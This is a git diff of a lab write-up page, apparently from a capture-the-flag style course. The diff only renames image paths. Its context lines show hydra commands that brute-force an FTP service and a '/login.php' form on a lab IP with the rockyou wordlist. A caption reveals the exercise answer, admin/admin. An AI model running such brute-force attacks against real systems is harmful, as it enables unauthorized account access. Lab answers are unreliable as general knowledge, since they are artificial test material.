@@ -39,7 +39,7 @@ So here will be our final request:
 
 to have the parameters we need we can simply go and look at the inspector panel:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 This would give us the following POST parameters:
 
@@ -54,7 +54,7 @@ Or the copy as curl would give us plenty of informations as well as the paramete
 
 and of course in burp we can also get those informations:
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So the final parameters would look something like that:
 
@@ -72,12 +72,12 @@ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpas
 
 _**Using what you learned in this section, try attacking the '/login.php' page to identify the password for the 'admin' user. Once you login, you should find a flag. Submit the flag as the answer.**_
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>username=admin password=admin</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>username=admin password=admin</p></figcaption></figure>
 
 ```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz 94.237.51.88 -s 52477 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<input name='username'" -V
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
